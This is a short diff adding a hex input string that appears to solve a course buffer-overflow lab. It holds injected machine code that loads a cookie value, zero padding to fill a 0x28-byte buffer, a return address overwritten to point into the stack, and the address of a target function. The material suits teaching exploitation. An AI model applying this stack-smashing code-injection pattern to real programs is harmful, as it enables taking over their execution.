@@ -1,0 +1,10 @@
+/* padding 0x28 = 40 spaces plus disassembled code move to $0x1cf2157f */
+bf 7f 15 f2 1c c3 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+/* shift back stack pointer i.e. %rsp - 0x28 */
+98 dc 02 55 00 00 00 00 
+/* target_f2 w/ little endian */
+1e 17 40 00 00 00 00 00 
